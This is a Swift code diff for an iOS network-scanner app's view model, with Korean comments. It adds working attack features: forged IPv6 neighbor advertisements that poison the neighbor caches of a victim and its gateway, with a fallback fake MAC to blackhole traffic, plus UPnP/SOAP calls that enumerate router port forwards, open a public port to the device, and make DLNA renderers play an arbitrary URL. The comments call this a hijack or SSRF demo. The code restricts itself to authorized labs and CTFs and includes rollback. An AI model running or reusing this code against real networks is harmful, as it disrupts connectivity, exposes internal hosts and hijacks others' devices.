@@ -65,8 +65,14 @@ final class ScanViewModel {
     @ObservationIgnored private let dhcpSniffer: any DHCPSniffing
     @ObservationIgnored private let vendorLookup: (MACAddress) -> String?
     @ObservationIgnored private let wakeSender = MagicPacketSender()
-    /// (인가된 실험 전용) IPv6 이웃 광고(NA)를 위조해 이웃 캐시에 독을 묻힌다 — NeighborProber와 같은 ICMPv6 소켓
+    /// (인가된 실험 전용) IPv6 이웃 광고(NA)를 위조해 이웃 캐시를 교란(블랙홀) 시도 + 송신 가능 여부 측정.
+    /// 스톡 iOS 커널은 비루트 앱에 NA 송신을 안 허용(EPERM) — 랩의 루트 맥·리눅스에서만 나간다.
     @ObservationIgnored private let neighborSpoofer = NDPSpoofer(advertiser: SystemNeighborAdvertiser())
+    /// (인가된 자기 네트워크·CTF 전용) UPnP/SOAP 제어 — 유니캐스트 TCP/HTTP라 iOS에서 entitlement 없이 실제로 동작한다
+    @ObservationIgnored private let upnpUDP: any DatagramExchanging = UDPExchange()
+    @ObservationIgnored private let upnpHTTP: any HTTPFetching = HTTPFetcher()
+    /// 롤백용: 방금 AddPortMapping으로 연 규칙(공인 포트, TCP인지)
+    @ObservationIgnored private var openedMapping: (externalPort: UInt16, tcp: Bool)?
     /// 앱이 백그라운드로 간 뒤 진행 중인 스캔을 마무리하는 시간(약 30초)
     @ObservationIgnored private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
     @ObservationIgnored private let bannerGrabber: any BannerGrabbing
@@ -167,53 +173,240 @@ final class ScanViewModel {
         return await wakeSender.wake(mac: mac, lastKnownIP: device.address, broadcast: scannedNetwork?.subnet.broadcast)
     }
 
-    /// NDP 스푸핑 한 판의 결과(상세 화면에 한 줄로 보여 준다).
+    /// NDP 이웃 캐시 교란 한 판의 결과(상세 화면에 한 줄로 보여 준다).
     enum NeighborSpoofResult: Equatable {
         case sent(Int)
         case blocked
         case noNetwork
         case noVictimIPv6
         case noGatewayIPv6
-        case noOwnMAC
 
         var message: String {
             switch self {
             case .sent(let n):
-                return "NDP 스푸핑: 위조 이웃 광고 \(n)통을 보냈어요. 상대 이웃 캐시가 바뀌었는지 다시 스캔해 확인하세요(끝나고 캐시는 원복했어요)."
+                return "NDP 교란(실험): 위조 이웃 광고 \(n)통이 커널을 빠져나갔어요. 상대·게이트웨이 이웃 캐시가 테스트용 가짜 MAC으로 바뀌었는지 피해자 쪽에서 확인하세요(예: ip -6 neigh). 끝나고 진짜 MAC으로 원복을 보냈어요."
             case .blocked:
-                return "NDP 스푸핑: iOS가 ICMPv6 송신을 막았어요 — 이 기기에선 불가(랩의 맥·리눅스에선 됩니다)."
+                return "NDP 교란(실험): iOS가 이웃 광고(ICMPv6 136) 송신을 막았어요. 스톡 iOS 커널은 비루트 앱에 echo·NI 쿼리만 허용해서(EPERM) 이 기기에선 불가예요 — 랩의 루트 맥·리눅스에서만 나갑니다."
             case .noNetwork:
-                return "NDP 스푸핑: 먼저 스캔하세요."
+                return "NDP 교란(실험): 먼저 스캔하세요."
             case .noVictimIPv6:
-                return "NDP 스푸핑: 이 기기의 링크로컬 IPv6(fe80::…)를 아직 몰라요 — 먼저 스캔해 이웃을 찾으세요."
+                return "NDP 교란(실험): 이 기기의 링크로컬 IPv6(fe80::…)를 아직 몰라요 — 먼저 스캔해 이웃을 찾으세요."
             case .noGatewayIPv6:
-                return "NDP 스푸핑: 게이트웨이의 링크로컬 IPv6를 아직 몰라요."
-            case .noOwnMAC:
-                return "NDP 스푸핑: iOS가 내 Wi-Fi MAC을 가려(02:…) 위조에 쓸 수 없어요 — 이 기기에선 불가."
+                return "NDP 교란(실험): 게이트웨이의 링크로컬 IPv6를 아직 몰라요 — 먼저 스캔하세요."
             }
         }
     }
 
-    /// (인가된 테스트 전용) IPv6 이웃 광고(NA)를 위조해 `device`의 이웃 캐시에 "게이트웨이는 내 MAC"을,
-    /// 게이트웨이에는 "이 기기는 내 MAC"을 심어 중간자를 시도한다(`NDPSpoof.mitm`). 몇 초 보낸 뒤 진짜 MAC으로 원복한다.
-    /// iOS가 ICMPv6 송신·자기 MAC을 막는지는 실제로 측정해 결과로 돌려준다(ARP 스푸핑의 IPv6 사촌).
+    /// (인가된 테스트 전용) IPv6 이웃 광고(NA)를 위조해 `device`와 게이트웨이의 이웃 캐시를 가짜 MAC으로 덮어
+    /// 둘 사이 IPv6 연결을 교란(블랙홀)한다(`NDPSpoof.mitm`). 실제로 송신을 시도해 나갔는지/막혔는지 측정한다.
+    ///
+    /// 스톡 iOS는 커널이 비루트 앱의 ICMPv6 송신을 echo·NI 쿼리로 제한해(XNU icmp6_dgram_send) NA(136)
+    /// 송신이 EPERM으로 막힌다 — 실기기에선 .blocked로 측정될 것이다(랩의 루트 맥·리눅스에선 나간다).
+    /// iOS는 자기 Wi-Fi MAC도 가리므로, 교란용 가짜 MAC(LAN에 없는 로컬관리 주소)을 쓴다(공격자 실제 MAC 불요).
     func spoofNeighbor(_ device: Device, for duration: Duration = .seconds(6)) async -> NeighborSpoofResult {
         guard let network = scannedNetwork else { return .noNetwork }
         guard let victim6 = device.ipv6Addresses.first(where: \.isLinkLocal) else { return .noVictimIPv6 }
-        guard let gatewayDevice = devices[network.gateway.address],
-              let gateway6 = gatewayDevice.ipv6Addresses.first(where: \.isLinkLocal) else { return .noGatewayIPv6 }
-        guard let myMAC = Interfaces.linkLayerAddress(of: network.interfaceName ?? "en0") else { return .noOwnMAC }
+        // 게이트웨이(라우터)는 Bonjour로 MAC을 안 알려 ipv6Addresses가 비기 쉽다 → IPv6 기본 경로에서 라우터 fe80::를 읽는다
+        let gatewayDevice = devices[network.gateway.address]
+        guard let gateway6 = gatewayDevice?.ipv6Addresses.first(where: \.isLinkLocal)
+            ?? RouteTable.readIPv6Gateway(interfaceIndex: Interfaces.index(of: network.interfaceName))
+        else { return .noGatewayIPv6 }
 
-        let targets = NDPSpoof.mitm(victim: victim6, gateway: gateway6, attackerMAC: myMAC)
+        // 내 MAC을 읽히면 쓰고, iOS가 가리면 LAN에 없는 로컬관리 가짜 MAC으로 캐시를 블랙홀시킨다(내 실제 MAC 불요)
+        let poisonMAC = Interfaces.linkLayerAddress(of: network.interfaceName)
+            ?? MACAddress([0x02, 0x00, 0xDE, 0xAD, 0xBE, 0xEF])!
+        let targets = NDPSpoof.mitm(victim: victim6, gateway: gateway6, attackerMAC: poisonMAC)
         let run = await neighborSpoofer.poison(targets, on: network.interfaceName, every: .seconds(2), for: duration)
 
         // 뒷정리: 아는 진짜 MAC으로 양쪽 캐시를 원복한다(impersonatedIP별로 매핑)
         var realMACs: [IPv6Address: MACAddress] = [:]
-        if let gatewayMAC = gatewayDevice.mac?.address { realMACs[gateway6] = gatewayMAC }
+        if let gatewayMAC = gatewayDevice?.mac?.address { realMACs[gateway6] = gatewayMAC }
         if let victimMAC = device.mac?.address { realMACs[victim6] = victimMAC }
         _ = neighborSpoofer.restore(targets, realMACs: realMACs, on: network.interfaceName)
 
         return run.blocked ? .blocked : .sent(run.sent)
+    }
+
+    // MARK: - UPnP/SOAP 제어 (인가된 자기 네트워크·CTF 전용)
+
+    /// UPnP 제어 한 번의 결과(상세 화면에 보여 준다).
+    enum UPnPControlResult: Equatable {
+        /// 정찰: 공인 IP + 기존 포워딩 규칙 목록(사람이 읽는 줄)
+        case recon(externalIP: String?, mappings: [String])
+        case opened(externalPort: UInt16, internalClient: String)
+        case closed(externalPort: UInt16)
+        case playing(uri: String)
+        case noNetwork
+        case noSelfIP
+        case noUPnPResponse
+        case noDescription
+        case noIGD
+        case noRenderer
+        case fault(code: String, description: String)
+        case failed
+
+        var message: String {
+            switch self {
+            case .recon(let ip, let mappings):
+                let head = ip.map { "공인(WAN) IP \($0)" } ?? "공인 IP는 못 읽음"
+                if mappings.isEmpty { return "UPnP 정찰: \(head). 등록된 포트포워딩 규칙은 없어요." }
+                return "UPnP 정찰: \(head). 포워딩 규칙 \(mappings.count)개\n" + mappings.joined(separator: "\n")
+            case .opened(let port, let client):
+                return "UPnP 변경: 공인 포트 \(port) → \(client):\(port) TCP 포워딩을 열었어요(설명 NAGO-NET-TEST, 1시간 임대). 반드시 '닫기(롤백)'로 지우세요."
+            case .closed(let port):
+                return "UPnP 롤백: 공인 포트 \(port) 포워딩을 지웠어요."
+            case .playing(let uri):
+                return "UPnP 변경: 렌더러에 재생을 지시했어요 — \(uri)"
+            case .noNetwork: return "UPnP: 먼저 스캔하세요."
+            case .noSelfIP: return "UPnP: 이 기기의 IP를 몰라요 — 스캔 후 다시 시도하세요."
+            case .noUPnPResponse: return "UPnP: 이 기기가 유니캐스트 M-SEARCH에 응답하지 않아요 — UPnP가 꺼졌거나 멀티캐스트 발견만 지원해요(공유기 설정에서 UPnP/IGD를 켜 보세요)."
+            case .noDescription: return "UPnP: 응답은 왔지만 설명(description.xml)을 못 받았어요 — 포트/경로가 막혔거나 주소가 기기와 달라요."
+            case .noIGD: return "UPnP: 응답은 왔지만 IGD(WAN 연결) 서비스가 없어요 — 공유기가 아니거나 IGD 미지원이에요."
+            case .noRenderer: return "UPnP: 이 기기에서 DLNA AVTransport(렌더러)를 못 찾았어요(Chromecast·Roku는 UPnP가 아니라 불가)."
+            case .fault(let code, let desc): return "UPnP 실패: 기기가 거부했어요(SOAP 폴트 \(code) \(desc))."
+            case .failed: return "UPnP: 연결/응답 실패 — 이 기기가 UPnP 제어를 안 열었거나 경로가 막혔어요."
+            }
+        }
+    }
+
+    /// 발견한 UPnP 제어 과녁: 어느 기기의 어느 controlURL로 어느 serviceType을 POST 할지.
+    private struct UPnPTarget {
+        let host: IPv4
+        let port: UInt16
+        let path: String
+        let tls: Bool
+        let serviceType: String
+    }
+
+    /// controlURL 찾기의 결과: 어느 단계에서 멈췄는지 구분해 사용자에게 원인을 알린다.
+    private enum UPnPDiscovery {
+        case found(UPnPTarget)
+        case noResponse       // M-SEARCH 무응답
+        case noDescription    // 응답은 왔으나 설명 XML을 못 받음
+        case noService        // 설명은 받았으나 원하는 서비스가 없음
+    }
+
+    /// 공유기 IGD를 찾을 때 바꿔 가며 쏘는 검색 대상(ST). rootdevice에 답 안 하는 공유기를 위해.
+    private static let igdSearchTargets = [
+        "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
+        "urn:schemas-upnp-org:device:InternetGatewayDevice:2",
+        "upnp:rootdevice",
+        "ssdp:all",
+    ]
+    /// DLNA 렌더러를 찾을 때 쓰는 검색 대상.
+    private static let rendererSearchTargets = [
+        "urn:schemas-upnp-org:device:MediaRenderer:1",
+        "upnp:rootdevice",
+        "ssdp:all",
+    ]
+
+    /// 지정 기기에서 원하는 서비스의 controlURL을 찾는다: ST를 바꿔 가며 유니캐스트 M-SEARCH → 설명 XML → serviceList.
+    /// `needles`는 serviceType에 들어 있어야 할 부분문자열(버전 차이를 넘기려 부분일치). 멈춘 단계까지 돌려준다.
+    private func discoverControl(on host: IPv4, matching needles: [String], searchTargets: [String]) async -> UPnPDiscovery {
+        var sawResponse = false
+        var sawDescription = false
+        for searchTarget in searchTargets {
+            guard let reply = await upnpUDP.exchange(SSDP.searchRequest(to: host, searchTarget: searchTarget), with: host, port: SSDP.port, timeout: .seconds(2)),
+                  let (location, _) = SSDP.parseResponse(reply) else { continue }
+            sawResponse = true
+            guard let descTarget = SSDP.descriptionTarget(location, expectedHost: host),
+                  let xmlBytes = await upnpHTTP.get(host: host, port: descTarget.port, path: descTarget.path, tls: descTarget.tls) else { continue }
+            sawDescription = true
+            let xml = String(decoding: xmlBytes.prefix(256 * 1024), as: UTF8.self)
+            let services = SSDP.services(in: xml)
+            for needle in needles {
+                if let service = services.first(where: { $0.serviceType.range(of: needle, options: .caseInsensitive) != nil }),
+                   let control = SSDP.controlTarget(controlURL: service.controlURL, base: location, expectedHost: host) {
+                    return .found(UPnPTarget(host: host, port: control.port, path: control.path, tls: control.tls, serviceType: service.serviceType))
+                }
+            }
+        }
+        if sawDescription { return .noService }
+        if sawResponse { return .noDescription }
+        return .noResponse
+    }
+
+    /// 못 찾은 이유를 결과로 바꾼다.
+    private func discoveryFailure(_ discovery: UPnPDiscovery, isRenderer: Bool) -> UPnPControlResult {
+        switch discovery {
+        case .found: return .failed
+        case .noResponse: return .noUPnPResponse
+        case .noDescription: return .noDescription
+        case .noService: return isRenderer ? .noRenderer : .noIGD
+        }
+    }
+
+    /// 정찰(기본·안전): 공유기 IGD에 공인 IP와 기존 포워딩 규칙을 묻는다. 아무것도 바꾸지 않는다.
+    func inspectGateway() async -> UPnPControlResult {
+        guard let network = scannedNetwork else { return .noNetwork }
+        let discovery = await discoverControl(on: network.gateway.address, matching: ["WANIPConnection", "WANPPPConnection"], searchTargets: Self.igdSearchTargets)
+        guard case .found(let igd) = discovery else { return discoveryFailure(discovery, isRenderer: false) }
+
+        var externalIP: String?
+        let ext = UPnPControl.getExternalIPAddress(serviceType: igd.serviceType)
+        if let reply = await post(igd, ext) { externalIP = UPnPControl.parseResponse(reply)["NewExternalIPAddress"] }
+
+        var mappings: [String] = []
+        for index in 0..<64 {
+            let entry = UPnPControl.getGenericPortMappingEntry(index: index, serviceType: igd.serviceType)
+            guard let reply = await post(igd, entry), UPnPControl.fault(reply) == nil else { break }   // 인덱스 끝이면 폴트
+            let out = UPnPControl.parseResponse(reply)
+            let proto = out["NewProtocol"] ?? "?"
+            let external = out["NewExternalPort"] ?? "?"
+            let client = out["NewInternalClient"] ?? "?"
+            let internalPort = out["NewInternalPort"] ?? "?"
+            let desc = out["NewPortMappingDescription"] ?? ""
+            mappings.append("· \(proto) \(external) → \(client):\(internalPort) \(desc)")
+        }
+        return .recon(externalIP: externalIP, mappings: mappings)
+    }
+
+    /// 변경(인가 전용): 공인 포트 → 이 기기:같은 포트 TCP 포워딩을 연다(설명 NAGO-NET-TEST, 1시간 임대). 롤백 정보 저장.
+    func openTestPortMapping(externalPort: UInt16 = 8888) async -> UPnPControlResult {
+        guard let network = scannedNetwork else { return .noNetwork }
+        guard let selfIP = devices.values.first(where: { $0.isSelf })?.address else { return .noSelfIP }
+        let discovery = await discoverControl(on: network.gateway.address, matching: ["WANIPConnection", "WANPPPConnection"], searchTargets: Self.igdSearchTargets)
+        guard case .found(let igd) = discovery else { return discoveryFailure(discovery, isRenderer: false) }
+        let add = UPnPControl.addPortMapping(externalPort: externalPort, protocolTCP: true, internalPort: externalPort,
+                                             internalClient: selfIP, description: "NAGO-NET-TEST", leaseSeconds: 3600,
+                                             serviceType: igd.serviceType)
+        guard let reply = await post(igd, add) else { return .failed }
+        if let fault = UPnPControl.fault(reply) { return .fault(code: fault.code, description: fault.description) }
+        openedMapping = (externalPort, true)
+        return .opened(externalPort: externalPort, internalClient: selfIP.description)
+    }
+
+    /// 롤백: 방금 연 포워딩 규칙을 지운다.
+    func closeTestPortMapping() async -> UPnPControlResult {
+        guard let network = scannedNetwork else { return .noNetwork }
+        guard let mapping = openedMapping else { return .failed }
+        let discovery = await discoverControl(on: network.gateway.address, matching: ["WANIPConnection", "WANPPPConnection"], searchTargets: Self.igdSearchTargets)
+        guard case .found(let igd) = discovery else { return discoveryFailure(discovery, isRenderer: false) }
+        let del = UPnPControl.deletePortMapping(externalPort: mapping.externalPort, protocolTCP: mapping.tcp, serviceType: igd.serviceType)
+        guard let reply = await post(igd, del) else { return .failed }
+        if let fault = UPnPControl.fault(reply) { return .fault(code: fault.code, description: fault.description) }
+        openedMapping = nil
+        return .closed(externalPort: mapping.externalPort)
+    }
+
+    /// 변경(인가 전용): DLNA 렌더러에 임의 URL을 재생시킨다(SetAVTransportURI + Play). 화면·음성 탈취/blind SSRF 데모.
+    func playOnRenderer(_ device: Device, uri: String) async -> UPnPControlResult {
+        guard scannedNetwork != nil else { return .noNetwork }
+        let discovery = await discoverControl(on: device.address, matching: ["AVTransport"], searchTargets: Self.rendererSearchTargets)
+        guard case .found(let av) = discovery else { return discoveryFailure(discovery, isRenderer: true) }
+        let set = UPnPControl.setAVTransportURI(uri: uri)
+        guard let setReply = await post(av, set) else { return .failed }
+        if let fault = UPnPControl.fault(setReply) { return .fault(code: fault.code, description: fault.description) }
+        let play = UPnPControl.play()
+        guard let playReply = await post(av, play) else { return .failed }
+        if let fault = UPnPControl.fault(playReply) { return .fault(code: fault.code, description: fault.description) }
+        return .playing(uri: uri)
+    }
+
+    /// 발견한 과녁으로 SOAP 액션을 POST 한다.
+    private func post(_ target: UPnPTarget, _ action: (soapAction: String, body: [UInt8])) async -> [UInt8]? {
+        await upnpHTTP.post(host: target.host, port: target.port, path: target.path, tls: target.tls,
+                            soapAction: action.soapAction, body: action.body)
     }
 
     /// 지금 목록을 CSV로 내보내기. 기기가 없으면 nil
@@ -645,11 +838,21 @@ final class ScanViewModel {
         let targets = devices.values.flatMap(\.ipv6Addresses).filter(\.isLinkLocal)
         let finding = await neighborProber.harvest(on: network.interfaceName, provoking: targets, for: .seconds(4))
         for (ip6, mac) in finding.found {
-            guard let address = devices.first(where: { $0.value.ipv6Addresses.contains(ip6) })?.key else { continue }
+            // 그 IPv6를 이미 가진 기기, 없으면 그 MAC을 아는 기기에 붙인다(ND가 처음 알려 준 fe80::라도 짝지어진다)
+            let address = devices.first(where: { $0.value.ipv6Addresses.contains(ip6) })?.key
+                ?? devices.first(where: { $0.value.mac?.address == mac })?.key
+            guard let address else { continue }
+            var changed = false
+            // 발견한 링크로컬(fe80::)을 기기에 저장해 둔다 — 이후 NDP 스푸핑 등 그 주소가 필요한 기능이 쓸 수 있게
+            if ip6.isLinkLocal, devices[address]?.ipv6Addresses.contains(ip6) == false {
+                devices[address]?.ipv6Addresses.append(ip6)
+                changed = true
+            }
             if devices[address]?.neighborMAC != mac {
                 devices[address]?.neighborMAC = mac
-                refresh(address)
+                changed = true
             }
+            if changed { refresh(address) }
         }
         // 이번 판은 캐시가 데워져 0개여도, 그동안 ND로 잡은 전체 개수를 보여 준다(마지막 판만 보여 혼란스럽던 것 고침)
         let total = devices.values.filter { $0.neighborMAC != nil }.count
